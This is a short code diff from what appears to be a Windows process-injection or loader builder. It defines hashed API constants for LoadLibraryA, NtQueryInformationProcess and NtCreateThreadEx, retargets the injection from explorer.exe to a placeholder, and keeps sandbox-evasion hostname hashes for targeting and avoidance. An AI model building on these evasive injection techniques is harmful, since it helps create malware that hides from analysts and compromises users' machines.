@@ -6,7 +6,7 @@ const ObjHash NTDLL_HASH = %MODHASH__ntdll.dll%;
 const ObjHash USER32_HASH = %MODHASH__user32.dll%;
 const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;
 
-const ObjHash TARGET_PROCESS_NAME_HASH = %FCTHASH__explorer.exe%;
+const ObjHash TARGET_PROCESS_NAME_HASH = %FCTHASH__target_process%;
 
 const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
 const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;
@@ -32,7 +32,6 @@ const ObjHash CREATE_THREAD_HASH = %FCTHASH__NtCreateThreadEx%;
 const ObjHash WAIT_FOR_SINGLE_OBJECT_HASH = %FCTHASH__NtWaitForSingleObject%;
 
 
-// will change this to hashes
 const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %SANDBOX__TARGET_HOSTNAME%;
 const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[] = {
     %SANDBOX__AVOID_HOSTNAME%
